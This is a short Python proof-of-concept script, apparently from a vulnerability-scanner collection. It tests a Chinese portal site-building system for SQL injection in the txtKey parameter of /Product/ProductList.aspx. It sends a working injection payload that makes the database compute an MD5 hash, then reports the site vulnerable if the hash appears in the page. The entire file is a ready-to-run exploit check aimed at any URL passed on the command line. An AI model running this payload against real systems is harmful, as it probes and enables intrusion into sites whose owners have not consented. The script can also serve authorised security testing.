#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 铭万门户建站系统ProductList SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-0104558
author: Lucifer
description: 文件/Product/ProductList.aspx参数txtKey存在注入漏洞。
'''
import sys
import requests
import warnings
  


class mainone_ProductList_sqli:
    def __init__(self, url):
        self.url = url

    def run(self):
        result = ['铭万门户建站系统ProductList SQL注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/Product/ProductList.aspx?type=Category&ID=-1&txtKey=%%27%2BAnD%201=(SeLeCt%20Sys.Fn_VarBinToHexStr(HashBytes(%27Md5%27,%271234%27)))%20AnD%2B%27%%27=%27"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = mainone_ProductList_sqli(sys.argv[1])
    testVuln.run()